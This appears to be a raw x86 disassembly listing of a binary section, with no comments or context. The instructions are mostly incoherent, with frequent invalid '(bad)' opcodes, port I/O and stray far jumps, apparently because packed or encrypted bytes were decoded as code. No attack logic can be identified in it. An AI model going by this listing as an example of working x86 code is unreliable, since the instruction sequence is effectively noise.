  40c9c0:	mov    al,0x24
  40c9c2:	stc    
  40c9c3:	pop    edx
  40c9c4:	inc    esp
  40c9c5:	cmp    al,0xcc
  40c9c7:	xor    BYTE PTR [ebp-0x72],dl
  40c9ca:	pop    ds
  40c9cb:	outs   dx,DWORD PTR ds:[esi]
  40c9cc:	adc    dl,BYTE PTR [ecx+0x31]
  40c9cf:	in     eax,0x37
  40c9d1:	lds    esp,FWORD PTR [ecx]
  40c9d3:	ja     0x40c9c3
  40c9d5:	test   esi,esp
  40c9d7:	cmp    BYTE PTR [ecx-0x67ceaafb],0xd6
  40c9de:	push   0xffffffbd
  40c9e0:	or     cl,dh
  40c9e2:	mov    ch,BYTE PTR [edx+0x14]
  40c9e5:	add    ebx,ebx
  40c9e7:	sub    DWORD PTR [edi+eax*2-0x55],ecx
  40c9eb:	clc    
  40c9ec:	sub    bh,BYTE PTR [ebx-0x781c36a0]
  40c9f2:	(bad)  
  40c9f3:	xchg   DWORD PTR [ecx-0x27],ebp
  40c9f6:	in     al,dx
  40c9f7:	inc    esi
  40c9f8:	mov    ah,0xa3
  40c9fa:	(bad)  
  40c9fb:	retf   
  40c9fc:	nop
  40c9fd:	add    bl,BYTE PTR [ecx]
  40c9ff:	push   ds
  40ca00:	out    0xc8,eax
  40ca02:	rcl    DWORD PTR [esi+0x6446be7c],1
  40ca08:	fstp   TBYTE PTR [eax-0x4fdd9b7f]
  40ca0e:	js     0x40c9d8
  40ca10:	retf   0xc5f9
  40ca13:	test   DWORD PTR [ecx],ebx
  40ca15:	out    dx,eax
  40ca16:	mov    ebp,0x5782410f
  40ca1b:	cli    
  40ca1c:	xlat   BYTE PTR ds:[ebx]
  40ca1d:	stc    
  40ca1e:	adc    bl,bh
  40ca20:	xor    al,0x47
  40ca22:	dec    esp
  40ca23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca24:	clc    
  40ca25:	aad    0xcb
  40ca27:	das    
  40ca28:	ja     0x40c9d4
  40ca2a:	addr16 or cl,bh
  40ca2d:	xchg   BYTE PTR [eax],bh
  40ca2f:	sbb    ecx,eax
  40ca31:	ret    0x2231
  40ca34:	add    bh,BYTE PTR [ecx-0x5e]
  40ca37:	lea    ebx,[esi]
  40ca39:	mov    ecx,0x3312ac72
  40ca3e:	mov    cl,0x1
  40ca40:	dec    ebx
  40ca41:	xchg   esp,eax
  40ca42:	mov    edi,0xcd082ee9
  40ca47:	fstp   QWORD PTR [edx+0x5e]
  40ca4a:	into   
  40ca4b:	push   es
  40ca4c:	dec    DWORD PTR [ebp-0x44]
  40ca4f:	xchg   ebx,eax
  40ca50:	(bad)  
  40ca51:	out    0x9e,al
  40ca53:	mov    cl,BYTE PTR [esi]
  40ca55:	dec    eax
  40ca56:	dec    ebp
  40ca57:	imul   ebx,DWORD PTR [edi-0x57082184],0x264b32bb
  40ca61:	pop    ebp
  40ca62:	mov    ds:0x9d69b163,al
  40ca67:	test   DWORD PTR [esi+edi*1],0x573ea4a7
  40ca6e:	loope  0x40ca4c
  40ca70:	jns    0x40cad6
  40ca72:	push   edx
  40ca73:	lahf   
  40ca74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca75:	ins    BYTE PTR es:[edi],dx
  40ca76:	dec    esi
  40ca77:	into   
  40ca78:	jns    0x40ca9b
  40ca7a:	pop    ebx
  40ca7b:	push   0x76fe9e03
  40ca80:	xor    al,0x29
  40ca82:	nop
  40ca83:	scas   al,BYTE PTR es:[edi]
  40ca84:	add    DWORD PTR [ebp+0x66],ebx
  40ca87:	les    ecx,FWORD PTR [eax+eax*8+0x7b]
  40ca8b:	xchg   ecx,eax
  40ca8c:	or     BYTE PTR [ebp-0x1b8d9a9d],ch
  40ca92:	(bad)  
  40ca93:	pop    esp
  40ca94:	xchg   edx,eax
  40ca95:	mov    WORD PTR [esi+0x48],cs
  40ca98:	out    dx,al
  40ca99:	push   es
  40ca9a:	mov    dh,ch
  40ca9c:	inc    esp
  40ca9d:	aam    0x2c
  40ca9f:	push   edx
  40caa0:	mov    edx,0x9ad93691
  40caa5:	gs mov ebp,0xe4267a6e
  40caab:	push   edi
  40caac:	mov    bh,dh
  40caae:	push   esi
  40caaf:	ds pushf 
  40cab1:	(bad)  
  40cab2:	xor    eax,0x19325ed8
  40cab7:	xor    edx,ebp
  40cab9:	dec    edi
  40caba:	inc    esp
  40cabb:	push   ss
  40cabc:	pop    ebx
  40cabd:	mov    al,0x24
  40cabf:	jo     0x40ca4d
  40cac1:	dec    edi
  40cac2:	pop    esp
  40cac3:	pop    ss
  40cac4:	mov    eax,ds:0x2211fe41
  40cac9:	pop    ss
  40caca:	fst    DWORD PTR [ebx+ebx*8-0x3194b583]
  40cad1:	ins    BYTE PTR es:[edi],dx
  40cad2:	jg     0x40cadf
  40cad4:	jmp    0x40cb20
  40cad6:	inc    edx
  40cad7:	outs   dx,DWORD PTR ds:[esi]
  40cad8:	js     0x40ca86
  40cada:	sbb    eax,0xfaba41c0
  40cadf:	push   ebx
  40cae0:	xor    al,0x4a
  40cae2:	mov    WORD PTR [esi+ecx*4-0x538ea192],?
  40cae9:	or     DWORD PTR [edi-0x61599780],esi
  40caef:	pusha  
  40caf0:	pop    esi
  40caf1:	imul   edx,DWORD PTR [ebx],0xfffffff6
  40caf4:	pop    ebp
  40caf5:	fist   DWORD PTR [edi-0x5ad44ba4]
  40cafb:	neg    BYTE PTR [ebx+0x56595f88]
  40cb01:	add    BYTE PTR [edx-0xe4e7e18],dh
  40cb07:	mov    ebp,0x46792234
  40cb0c:	jmp    0xc73603b9
  40cb11:	xor    bl,BYTE PTR [ebx-0x410283bd]
  40cb17:	dec    ebx
  40cb18:	(bad)  
  40cb19:	repz cmp DWORD PTR [edx-0x18],edi
  40cb1d:	sbb    eax,0x8aba3dfb
  40cb22:	ins    DWORD PTR es:[edi],dx
  40cb23:	sub    BYTE PTR [esi],dh
  40cb25:	stos   DWORD PTR es:[edi],eax
  40cb26:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40cb28:	and    bl,BYTE PTR [eax-0x8a77961]
  40cb2e:	arpl   ax,ax
  40cb30:	sbb    eax,0x8ace251b
  40cb35:	gs adc eax,0x90b98917
  40cb3b:	pop    edi
  40cb3c:	sub    edi,DWORD PTR [ebp+0x38]
  40cb3f:	xchg   DWORD PTR [ebp-0x6e],esp
  40cb42:	adc    al,0x31
  40cb44:	sbb    edx,DWORD PTR [esp+eax*8-0x79]
  40cb48:	mov    ebx,DWORD PTR [ebx]
  40cb4a:	cmp    al,0x23
  40cb4c:	test   DWORD PTR [edi-0x68],ebp
  40cb4f:	das    
  40cb50:	sti    
  40cb51:	dec    eax
  40cb52:	xor    bh,dl
  40cb54:	sbb    BYTE PTR ds:0xe168fd2,ch
  40cb5a:	outs   dx,BYTE PTR ds:[esi]
  40cb5b:	popf   
  40cb5c:	les    edi,FWORD PTR [ebx+edi*1]
  40cb5f:	pop    edx
  40cb60:	ja     0x40cb4b
  40cb62:	shl    BYTE PTR [esi-0x76],0x72
  40cb66:	inc    eax
  40cb67:	mov    edx,0xb2bd6668
  40cb6c:	shr    BYTE PTR [ecx],0x87
  40cb6f:	je     0x40cbb4
  40cb71:	stos   DWORD PTR es:[edi],eax
  40cb72:	mov    ecx,0xecc889b4
  40cb77:	and    bh,BYTE PTR ds:0x20168dd1
  40cb7d:	loope  0x40cb2e
  40cb7f:	cmp    bh,BYTE PTR [ecx]
  40cb81:	xor    BYTE PTR [esi+0x4010385c],0xcb
  40cb88:	add    DWORD PTR [esi+eiz*4+0x40bf37ae],eax
  40cb8f:	xor    edi,DWORD PTR [ebp+ebp*8-0x52a52818]
  40cb96:	dec    eax
  40cb97:	pop    es
  40cb98:	sahf   
  40cb99:	and    BYTE PTR [ecx],ch
  40cb9b:	pop    edx
  40cb9c:	cmp    eax,0xdfd2f89
  40cba1:	jmp    FWORD PTR [esi]
  40cba3:	jnp    0x40cbf2
  40cba5:	cdq    
  40cba6:	pop    eax
  40cba7:	or     ecx,DWORD PTR [ebx-0x4c]
  40cbaa:	setl   BYTE PTR [eax]
  40cbad:	jbe    0x40cbf5
  40cbaf:	mov    esp,?
  40cbb1:	mov    ds:0xcff9e26c,eax
  40cbb6:	mov    al,BYTE PTR [ebx-0x2d1e3853]
  40cbbc:	idiv   ch
  40cbbe:	add    BYTE PTR [edi-0x2d],bl
  40cbc1:	cld    
  40cbc2:	shl    BYTE PTR [si+0x5e],0xfe
  40cbc7:	xor    eax,0xbc522395
  40cbcc:	ins    BYTE PTR es:[edi],dx
  40cbcd:	xchg   BYTE PTR [edx+0x45ce1c6f],dl
  40cbd3:	pop    ecx
  40cbd4:	dec    edi
  40cbd5:	outs   dx,BYTE PTR ds:[esi]
  40cbd6:	arpl   cx,si
  40cbd8:	shr    BYTE PTR [edx-0x4e],1
  40cbdb:	push   edx
  40cbdc:	xor    dh,dl
  40cbde:	retf   0xa861
  40cbe1:	lods   al,BYTE PTR ds:[esi]
  40cbe2:	aad    0x7f
  40cbe4:	cdq    
  40cbe5:	stos   BYTE PTR es:[edi],al
  40cbe6:	mov    ebx,0x11a07679
  40cbeb:	dec    ecx
  40cbec:	out    0xf0,al
  40cbee:	ja     0x40cbac
  40cbf0:	ficom  WORD PTR [ecx+0x3672d218]
  40cbf6:	ret    0x8fd5
  40cbf9:	or     BYTE PTR [edx-0x21],0xa3
  40cbfd:	int    0xee
  40cbff:	in     eax,dx
  40cc00:	mov    ebx,0x7be392db
  40cc05:	and    esp,esp
  40cc07:	mov    ds:0xda6db974,al
  40cc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc0d:	data16 int3 
  40cc0f:	inc    edx
  40cc10:	sti    
  40cc11:	fisubr DWORD PTR [edx-0x7f]
  40cc14:	fldcw  WORD PTR [ecx+0x7924d674]
  40cc1a:	and    ecx,esp
  40cc1c:	push   ebp
  40cc1d:	in     eax,dx
  40cc1e:	xchg   esi,eax
  40cc1f:	sbb    cl,cl
  40cc21:	push   ss
  40cc22:	dec    ebp
  40cc23:	push   esp
  40cc24:	fidivr WORD PTR [ebx]
  40cc26:	cdq    
  40cc27:	(bad)  
  40cc28:	push   edx
  40cc29:	mov    edi,0xc81b3d93
  40cc2e:	retf   
  40cc2f:	mov    al,ds:0x2c0d7e8d
  40cc34:	mov    ds:0x3a68fd4e,eax
  40cc39:	sbb    BYTE PTR [esi],dl
  40cc3b:	addr16 cmp al,0x8d
  40cc3e:	js     0x40cc45
  40cc40:	das    
  40cc41:	mov    dl,0x1b
  40cc43:	mov    dh,0x41
  40cc45:	jo     0x40cca7
  40cc47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc48:	xor    al,0xb8
  40cc4a:	dec    ecx
  40cc4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc4c:	xchg   edi,eax
  40cc4d:	(bad)  
  40cc4f:	jbe    0x40cca6
  40cc51:	mov    ah,0x40
  40cc53:	mov    esi,DWORD PTR [eax+0x3]
  40cc56:	out    dx,eax
  40cc57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc58:	out    dx,al
  40cc59:	push   0xdf52ea0d
  40cc5e:	bndstx [ebp-0x61],bnd2
  40cc62:	dec    BYTE PTR [esi]
  40cc64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc65:	push   ds
  40cc66:	mul    BYTE PTR [edx+0x61e60ec2]
  40cc6c:	adc    esp,eax
  40cc6e:	nop
  40cc6f:	aas    
  40cc70:	mov    ah,0xe
  40cc72:	lahf   
  40cc73:	adc    eax,0x49f6db16
  40cc79:	push   ebp
  40cc7a:	and    dl,BYTE PTR [ebx]
  40cc7c:	pop    ebp
  40cc7d:	xchg   esp,eax
  40cc7e:	adc    eax,0x650bb6a2
  40cc83:	mov    ds:0x5756077f,al
  40cc89:	pop    esp
  40cc8a:	(bad)  
  40cc8b:	aas    
  40cc8c:	adc    DWORD PTR [ecx+0x4b14937c],esi
  40cc92:	jae    0x40ccb5
  40cc94:	sbb    ah,cl
  40cc96:	fs sbb edx,esi
  40cc99:	std    
  40cc9a:	rcl    BYTE PTR [edi],1
  40cc9c:	jbe    0x40cc74
  40cc9e:	addr16 mov al,0x83
  40cca1:	xor    ecx,DWORD PTR [edi-0x25]
  40cca4:	shl    BYTE PTR [esi+0x3b],1
  40cca7:	mov    ebp,0xa1b97505
  40ccac:	and    eax,0xa2e98a8
  40ccb1:	scas   al,BYTE PTR es:[edi]
  40ccb2:	ror    eax,cl
  40ccb4:	call   ecx
  40ccb6:	xchg   ebp,eax
  40ccb7:	fisttp QWORD PTR [ecx+0x1d]
  40ccba:	or     bl,BYTE PTR [esi+0x8]
  40ccbd:	push   ss
  40ccbe:	nop
  40ccbf:	pop    ecx
  40ccc0:	jl     0x40ccfa
  40ccc2:	inc    ebx
  40ccc3:	icebp  
  40ccc4:	js     0x40cd2e
  40ccc6:	jno    0x40cd32
  40ccc8:	dec    esi
  40ccc9:	mov    dh,0xa9
  40cccb:	(bad)  
  40cccc:	rol    ebx,1
  40ccce:	cli    
  40cccf:	adc    edx,ebx
  40ccd1:	nop
  40ccd2:	inc    ecx
  40ccd3:	loop   0x40ccdb
  40ccd5:	and    dh,ch
  40ccd7:	shl    DWORD PTR [eax+edx*4+0x479de674],0x16
  40ccdf:	gs jmp 0x33e9015d
  40cce5:	adc    BYTE PTR [ebp-0x2654fe0b],ah
  40cceb:	call   0x50522880
  40ccf0:	fs jnp 0x40cd57
  40ccf3:	add    eax,0x95f92ef1
  40ccf8:	call   0xea52:0xe7de8521
  40ccff:	push   0x42bee887
  40cd04:	jns    0x40cd46
  40cd06:	add    DWORD PTR [esi],edi
  40cd08:	cmc    
  40cd09:	add    eax,0xaeded8a7
  40cd0e:	inc    esi
  40cd0f:	sub    al,al
  40cd11:	sbb    BYTE PTR [ebx],dh
  40cd13:	in     eax,dx
  40cd14:	jns    0x40cd1c
  40cd16:	dec    esp
  40cd17:	inc    esp
  40cd18:	add    esi,DWORD PTR [edi+0x36466530]
  40cd1e:	add    ebp,DWORD PTR [ebx-0x7fe61980]
  40cd24:	push   cs
  40cd25:	icebp  
  40cd26:	mov    esp,eax
  40cd28:	sbb    bh,bh
  40cd2a:	mov    ebp,0x2f25c61f
  40cd2f:	cmp    al,0xcd
  40cd31:	sbb    esp,ebx
  40cd33:	cmp    cl,BYTE PTR [ebx-0x76]
  40cd36:	xor    BYTE PTR [edx+0x3],bh
  40cd39:	jbe    0x40cd72
  40cd3b:	clc    
  40cd3c:	in     eax,0xc9
  40cd3e:	pop    esp
  40cd3f:	int    0xce
  40cd41:	mov    al,0x80
  40cd43:	pop    es
  40cd44:	and    BYTE PTR [eax],ch
  40cd46:	push   esi
  40cd47:	xchg   esi,eax
  40cd48:	pop    esp
  40cd49:	pusha  
  40cd4a:	add    ebp,DWORD PTR [eax*4+0x10d18e8a]
  40cd51:	inc    edx
  40cd52:	push   edx
  40cd53:	and    BYTE PTR [eax+0x76],dh
  40cd56:	je     0x40cda6
  40cd58:	int    0xb6
  40cd5a:	sar    BYTE PTR [ecx+0x4e129e1],1
  40cd60:	mov    ebx,0x5626aad1
  40cd65:	or     bh,cl
  40cd67:	pop    es
  40cd68:	imul   BYTE PTR [edi]
  40cd6a:	lds    ecx,FWORD PTR [eax]
  40cd6c:	mov    eax,ds:0xb1defced
  40cd71:	sbb    BYTE PTR [ecx+0x13ad1e4a],ah
  40cd77:	xchg   ebp,edi
  40cd79:	arpl   sp,dx
  40cd7b:	mov    WORD PTR [eax+0x7e3df46b],?
  40cd81:	fs pop es
  40cd83:	or     eax,0x40884833
  40cd88:	test   BYTE PTR [ecx+0x1f4de06d],bl
  40cd8e:	pop    esp
  40cd8f:	jecxz  0x40cd80
  40cd91:	lods   al,BYTE PTR ds:[esi]
  40cd92:	lea    esi,[esi-0x74]
  40cd95:	jmp    0x5e524064
  40cd9a:	loopne 0x40cd29
  40cd9c:	inc    eax
  40cd9d:	outs   dx,BYTE PTR ds:[esi]
  40cd9e:	pcmpgtb mm0,QWORD PTR [ebx]
  40cda1:	jg     0x40cd3c
  40cda3:	(bad)  
  40cda4:	sbb    DWORD PTR [esi+0xe],edi
  40cda7:	loope  0x40cd83
  40cda9:	dec    ebp
  40cdaa:	jns    0x40cd5d
  40cdac:	or     eax,0xc0daf64b
  40cdb1:	jmp    0xf638:0xb0587fd2
  40cdb8:	sub    esp,DWORD PTR [edi+0x39]
  40cdbb:	jl     0x40ce28
  40cdbd:	stos   BYTE PTR es:[edi],al
  40cdbe:	int3   
  40cdbf:	xor    ebp,DWORD PTR [eax-0x13]
  40cdc2:	scas   eax,DWORD PTR es:[edi]
  40cdc3:	out    dx,al
  40cdc4:	fwait
  40cdc5:	xchg   ebp,eax
  40cdc6:	sbb    BYTE PTR [edi],dh
  40cdc8:	mov    ebp,0xc7cef70
  40cdcd:	push   cs
  40cdce:	(bad)  
  40cdcf:	rcl    BYTE PTR [esi+0x23290e78],1
  40cdd5:	inc    esp
  40cdd6:	push   ss
  40cdd7:	shl    esi,cl
  40cdd9:	mov    eax,ds:0x6f18dc5
  40cdde:	ret    0xc699
  40cde1:	fwait
  40cde2:	in     al,dx
  40cde3:	packuswb mm1,QWORD PTR [edx]
  40cde6:	jb     0x40ce12
  40cde8:	push   ds
  40cde9:	outs   dx,BYTE PTR ds:[esi]
  40cdea:	stos   DWORD PTR es:[edi],eax
  40cdeb:	inc    ebp
  40cdec:	mov    cl,0x5f
  40cdee:	ret    
  40cdef:	scas   eax,DWORD PTR es:[edi]
  40cdf0:	es pop edi
  40cdf2:	push   cs
  40cdf3:	addr16 inc esp
  40cdf5:	mov    BYTE PTR [esi-0x3f36714],0xd2
  40cdfc:	pop    ebp
  40cdfd:	aam    0x11
  40cdff:	sbb    BYTE PTR [ebx],dh
  40ce01:	imul   edi,DWORD PTR [edx+ebx*8-0xe],0x41
  40ce06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce07:	ds push ds
  40ce09:	adc    al,0xdd
  40ce0b:	pop    ebp
  40ce0c:	xchg   ecx,eax
  40ce0d:	(bad)  
  40ce0e:	fistp  WORD PTR [ebx]
  40ce10:	inc    eax
  40ce11:	sti    
  40ce12:	loop   0x40ce79
  40ce14:	xchg   DWORD PTR [eax-0x6b],esp
  40ce17:	das    
  40ce18:	nop
  40ce19:	lods   eax,DWORD PTR ds:[esi]
  40ce1a:	or     eax,0xae596c4
  40ce1f:	cs xchg esi,eax
  40ce21:	add    al,0x9c
  40ce23:	inc    esp
  40ce24:	lods   al,BYTE PTR ds:[esi]
  40ce25:	int    0x7c
  40ce27:	sbb    eax,0x8698bdba
  40ce2c:	ins    DWORD PTR es:[edi],dx
  40ce2d:	in     al,0xda
  40ce2f:	fdiv   DWORD PTR [ebx]
  40ce31:	jp     0x40ce2d
  40ce33:	stos   BYTE PTR es:[edi],al
  40ce34:	or     eax,0xb6a58ab9
  40ce39:	sub    esp,0xf
  40ce3c:	dec    ebx
  40ce3d:	fsub   DWORD PTR [edi]
  40ce3f:	push   eax
  40ce40:	xor    BYTE PTR [edi-0xc2a697],cl
  40ce46:	pop    ebx
  40ce47:	(bad)  
  40ce48:	jmp    0x40ceb5
  40ce4a:	dec    edi
  40ce4b:	jo     0x40cdcd
  40ce4d:	cld    
  40ce4e:	addr16 fadd st,st(4)
  40ce51:	cld    
  40ce52:	mov    ah,0x64
  40ce54:	and    DWORD PTR [edi],0x78f5b662
  40ce5a:	jp     0x40ceaf
  40ce5c:	jge    0x40ce4f
  40ce5e:	cmp    DWORD PTR [esi],edx
  40ce60:	xor    al,0x25
  40ce62:	sbb    DWORD PTR [esi+0x35],0x4f
  40ce66:	fiadd  WORD PTR [ecx]
  40ce68:	sbb    al,bl
  40ce6a:	inc    ebx
  40ce6b:	loope  0x40cece
  40ce6d:	repnz push ss
  40ce6f:	out    dx,eax
  40ce70:	sbb    DWORD PTR [edx+0x24bc0758],eax
  40ce76:	push   ecx
  40ce77:	rep lods al,BYTE PTR ds:[esi]
  40ce79:	jae    0x40cdfb
  40ce7b:	dec    ecx
  40ce7c:	aam    0x78
  40ce7e:	add    cl,ah
  40ce80:	inc    ebx
  40ce81:	pusha  
  40ce82:	in     al,dx
  40ce83:	xor    ebp,DWORD PTR [ebx]
  40ce85:	std    
  40ce86:	repnz adc DWORD PTR [edi+0x1d],edi
  40ce8a:	push   0xdfec3b5d
  40ce8f:	(bad)  
  40ce90:	js     0x40ceda
  40ce92:	adc    ah,BYTE PTR [esi]
  40ce94:	outs   dx,DWORD PTR ds:[esi]
  40ce95:	xchg   ebp,eax
  40ce96:	mov    ch,BYTE PTR [ecx+eiz*1]
  40ce99:	push   ds
  40ce9a:	shl    esp,0xdb
  40ce9d:	lock mov eax,ds:0x83fbdb41
  40cea3:	jmp    0x1e5870c8
  40cea8:	add    al,0x67
  40ceaa:	in     al,0x94
  40ceac:	fisubr DWORD PTR ds:0x9d437ddb
  40ceb2:	sub    DWORD PTR [ecx*2-0x36e567c6],edi
  40ceb9:	pop    ecx
  40ceba:	loopne 0x40cec4
  40cebc:	fst    DWORD PTR [eax-0x52d98241]
  40cec2:	inc    ebp
  40cec3:	rcl    DWORD PTR [eax],0x0
  40cec6:	lods   eax,DWORD PTR ds:[esi]
  40cec7:	mov    ch,0x86
  40cec9:	sbb    dh,ch
  40cecb:	inc    ebx
  40cecc:	jbe    0x40ceb3
  40cece:	add    al,0x78
  40ced0:	ins    BYTE PTR es:[edi],dx
  40ced1:	mov    ebp,0x40e75d73
  40ced6:	jbe    0x40cea3
  40ced8:	and    DWORD PTR [edx-0x55],esp
  40cedb:	push   ss
  40cedc:	push   esp
  40cedd:	pop    ebp
  40cede:	in     eax,dx
  40cedf:	stos   DWORD PTR es:[edi],eax
  40cee0:	in     eax,0x9f
  40cee2:	fistp  QWORD PTR [edi-0x313bfd1f]
  40cee8:	fstp   DWORD PTR [esi+eax*2]
  40ceeb:	je     0x40cf46
  40ceed:	in     eax,0xf4
  40ceef:	mov    ch,0x12
  40cef1:	xchg   esi,eax
  40cef2:	sub    edi,esp
  40cef4:	dec    ebx
  40cef5:	push   edi
  40cef6:	cmp    eax,0x1688a15f
  40cefb:	sub    bh,bh
  40cefd:	sub    DWORD PTR [edi],ebp
  40ceff:	call   FWORD PTR [eax]
  40cf01:	and    al,0x2d
  40cf03:	and    eax,0xdca57c68
  40cf08:	mov    edx,0x55e2784e
  40cf0d:	icebp  
  40cf0e:	iret   
  40cf0f:	inc    ebp
  40cf10:	jp     0x40cf8d
  40cf12:	mov    al,0x73
  40cf14:	jo     0x40cf4e
  40cf16:	in     eax,0xf1
  40cf18:	imul   esi,DWORD PTR [edx+0x2afe68e1],0xf72f4c3d
  40cf22:	(bad)  
  40cf23:	jle    0x422cc131
  40cf29:	sti    
  40cf2a:	and    ch,BYTE PTR [eax+0x772f9a0c]
  40cf30:	test   eax,0xec63a62
  40cf35:	or     al,0x32
  40cf37:	(bad)  
  40cf39:	clc    
  40cf3a:	sub    esi,DWORD PTR [eax+eax*2+0x35]
  40cf3e:	xor    BYTE PTR [ebp+eax*2-0x6c],dl
  40cf42:	leave  
  40cf43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf44:	loope  0x40cf5f
  40cf46:	dec    esp
  40cf47:	ins    DWORD PTR es:[edi],dx
  40cf48:	mov    ds:0x6e5c0b15,eax
  40cf4d:	push   esi
  40cf4e:	das    
  40cf4f:	mov    bh,0x3b
  40cf51:	add    BYTE PTR [ebx+0x39],dh
  40cf54:	adc    ebx,DWORD PTR [edi+ebp*2+0x1ebc8660]
  40cf5b:	cmp    dl,al
  40cf5d:	sbb    eax,0x343b8ab9
  40cf62:	das    
  40cf63:	mov    al,0xdf
  40cf65:	xor    DWORD PTR [ebx+0x5e],edi
  40cf68:	sub    BYTE PTR [ecx+0x69],dh
  40cf6b:	mov    ?,eax
  40cf6d:	out    0xb6,eax
  40cf6f:	dec    esp
  40cf70:	and    ch,BYTE PTR [eax+0x6c]
  40cf73:	mov    dl,0xa
  40cf75:	mov    cl,0x7c
  40cf77:	mov    ecx,0xdc4d1432
  40cf7c:	rcr    BYTE PTR [esi-0x33],1
  40cf7f:	daa    
  40cf80:	dec    edi
  40cf81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf82:	dec    esi
  40cf83:	jecxz  0x40cf5a
  40cf85:	dec    eax
  40cf86:	jno    0x40cf79
  40cf88:	xchg   ecx,eax
  40cf89:	addr16 inc edi
  40cf8b:	and    DWORD PTR [edi+eiz*4-0x189621e5],edi
  40cf92:	out    0x72,eax
  40cf94:	repnz int 0x23
  40cf97:	mov    cl,BYTE PTR ds:0xa7d1a1c2
  40cf9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf9e:	js     0x40d005
  40cfa0:	cmp    BYTE PTR [edx+ebp*2+0x47],0xe8
  40cfa5:	repz sbb esp,edx
  40cfa8:	out    0x95,al
  40cfaa:	adc    edi,edx
  40cfac:	mov    esp,DWORD PTR [edi+0x2c]
  40cfaf:	push   es
  40cfb0:	mov    edi,0xe0be333f
  40cfb5:	cmp    DWORD PTR [eax+0x8],eax
  40cfb8:	push   0xfffffff7
  40cfba:	jne    0x40cfa9
  40cfbc:	cdq    
  40cfbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfbe:	mov    al,ds:0x7e52695a
  40cfc3:	dec    ecx
  40cfc4:	mov    cl,0xfd
  40cfc6:	mov    ah,0x5c
  40cfc8:	repz or ebp,DWORD PTR [ecx+ebx*2-0x59]
  40cfcd:	mov    cl,0x90
  40cfcf:	outs   dx,DWORD PTR ds:[esi]
  40cfd0:	jmp    0xc61bcb14
  40cfd5:	repz or al,0xa6
  40cfd8:	dec    ecx
  40cfd9:	xor    edx,DWORD PTR ds:0xe91c4255
  40cfdf:	bound  ebx,QWORD PTR [ebx+0x1d8af47]
  40cfe5:	inc    esp
  40cfe6:	push   edi
  40cfe7:	cli    
  40cfe8:	jb     0x40d062
  40cfea:	xor    DWORD PTR [esi],ecx
  40cfec:	inc    edi
  40cfed:	mov    ebp,0x99e29f7f
  40cff2:	dec    esi
  40cff3:	add    BYTE PTR [ebx+esi*1-0x2f604d99],dl
  40cffa:	in     al,dx
  40cffb:	outs   dx,DWORD PTR ds:[esi]
  40cffc:	add    al,al
  40cffe:	std    
  40cfff:	aad    0xb
  40d001:	mov    ds:0xf5225022,al
  40d006:	fstp   TBYTE PTR [edx+0x74]
  40d009:	inc    esp
  40d00a:	sub    bl,bh
  40d00c:	stos   DWORD PTR es:[edi],eax
  40d00d:	lods   al,BYTE PTR ds:[esi]
  40d00e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d00f:	jle    0x40cfaf
  40d011:	xchg   ebx,eax
  40d012:	sti    
  40d013:	idiv   BYTE PTR [edi-0x12aa1dc9]
  40d019:	xchg   esi,eax
  40d01a:	push   esp
  40d01b:	iret   
  40d01c:	cmp    BYTE PTR [ebx-0x3a],al
  40d01f:	jb     0x40d04f
  40d021:	and    DWORD PTR [eax-0xbda7d6c],esi
  40d027:	push   edx
  40d028:	xchg   ecx,eax
  40d029:	inc    BYTE PTR [eax]
  40d02b:	aad    0xda
  40d02d:	jno    0x40d075
  40d02f:	fild   DWORD PTR [ebx+eax*8+0x4ab2e350]
  40d036:	out    dx,eax
  40d037:	pop    edi
  40d038:	pop    dx
  40d03a:	ss repnz retf 
  40d03d:	and    al,0x4e
  40d03f:	pop    es
  40d040:	xor    ah,BYTE PTR [ecx+0x69]
  40d043:	aaa    
  40d044:	repnz fimul DWORD PTR [edi+0x65]
  40d048:	fs mov ebx,0xb6585e4b
  40d04e:	les    eax,FWORD PTR [edx-0x554aa296]
  40d054:	dec    ecx
  40d055:	xlat   BYTE PTR ds:[bx]
  40d057:	dec    edx
  40d058:	loope  0x40d01f
  40d05a:	ds jns 0x40d0cf
  40d05d:	mov    bl,0x94
  40d05f:	xchg   DWORD PTR [esi+0x4514d1da],esp
  40d065:	xor    eax,0x604b4d78
  40d06a:	pop    ecx
  40d06b:	dec    edi
  40d06c:	add    eax,0x6a61a1b6
  40d071:	jbe    0x40d019
  40d073:	add    BYTE PTR [edx],bl
  40d075:	les    eax,FWORD PTR [edx]
  40d077:	cmp    edx,edx
  40d079:	stc    
  40d07a:	cwde   
  40d07b:	fidivr DWORD PTR [ecx]
  40d07d:	popa   
  40d07e:	sub    eax,0xc3f2e81e
  40d083:	fnsave [ecx-0x2f]
  40d086:	cdq    
  40d087:	add    bh,ch
  40d089:	push   0x76
  40d08b:	jb     0x40d08e
  40d08d:	xchg   DWORD PTR ds:0xea0d6117,esi
  40d093:	rcl    DWORD PTR [ebp+0x2f48b4eb],0x1e
  40d09a:	cmp    ch,BYTE PTR es:0x676c4c4
  40d0a1:	sub    al,0x4f
  40d0a3:	int    0x81
  40d0a5:	ret    
  40d0a6:	jmp    0x40d073
  40d0a8:	mov    ds:0xcbd9c9d9,al
  40d0ad:	std    
  40d0ae:	adc    ebp,ebp
  40d0b0:	outs   dx,BYTE PTR ds:[esi]
  40d0b1:	pop    ecx
  40d0b2:	mov    cs,WORD PTR [ecx-0x5417a613]
  40d0b8:	cmp    DWORD PTR [esi],edx
  40d0ba:	data16 adc al,0x72
  40d0bd:	mov    cl,0xe3
  40d0bf:	mov    edi,0xc8b1ec6
  40d0c4:	push   ss
  40d0c5:	fdiv   QWORD PTR [esi+ecx*8]
  40d0c8:	pop    ss
  40d0c9:	and    DWORD PTR [edx],ecx
  40d0cb:	jp     0x40d058
  40d0cd:	jecxz  0x40d0e1
